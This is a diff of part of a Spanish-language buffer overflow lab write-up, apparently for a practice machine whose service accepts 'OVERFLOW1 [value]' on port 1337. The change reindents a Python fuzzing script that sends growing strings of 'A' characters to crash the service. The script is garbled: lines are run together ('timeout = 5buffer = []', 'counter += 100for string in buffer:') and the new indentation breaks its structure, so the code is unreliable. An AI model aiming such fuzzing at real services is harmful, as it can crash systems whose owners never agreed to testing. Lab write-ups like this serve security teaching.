@@ -38,27 +38,27 @@ Como vemos en la conexión por netcat recibimos un servidor el cual para empezar
 Vemos que nos salen varias opciones como *OVERFLOW1 [value]* básicamente nos está pidiendo que pongamos el comando overflow1 y que le pasemos un valor. En mi caso le pase el valor "test" y se ve que se lo tomo bien el servidor, ya que en el output puedo ver "Overflow1 COMPLETE".
 Ahora que pasaría si en vez de pasarle como parámetro "test" le pasamos 2000 caracteres, en este caso va a ser el carácter "A". Para eso utilizamos un script en python que empieza a mandarle bytes de forma incremental hasta llegar el punto de que el servidor se satura.
 
-import socket, time, sys
-ip = "IP MACHINE";  
-port = 1337  
-timeout = 5buffer = []  
-counter = 100  
-while len(buffer) < 30:  
-    buffer.append("A" * counter)  
-    counter += 100for string in buffer:  
-    try:  
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-        s.settimeout(timeout)  
-        connect = s.connect((ip, port))  
-        s.recv(1024)  
-        print("Fuzzing with %s bytes" % len(string))  
-        s.send("OVERFLOW1 " + string + "\r\n")  
-        s.recv(1024)  
-        s.close()  
-    except:  
-        print("Could not connect to " + ip + ":" + str(port))  
-        sys.exit(0)  
-    time.sleep(1)
+	import socket, time, sys
+	ip = "IP MACHINE";  
+	port = 1337  
+	timeout = 5buffer = []  
+	counter = 100  
+	while len(buffer) < 30:  
+	    buffer.append("A" * counter)  
+	    counter += 100for string in buffer:  
+	    try:  
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+		s.settimeout(timeout)  
+		connect = s.connect((ip, port))  
+		s.recv(1024)  
+		print("Fuzzing with %s bytes" % len(string))  
+		s.send("OVERFLOW1 " + string + "\r\n")  
+		s.recv(1024)  
+		s.close()  
+	    except:  
+		print("Could not connect to " + ip + ":" + str(port))  
+		sys.exit(0)  
+	    time.sleep(1)
     
 
 ![Fuzzing](https://i.ibb.co/GdZrhyr/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)
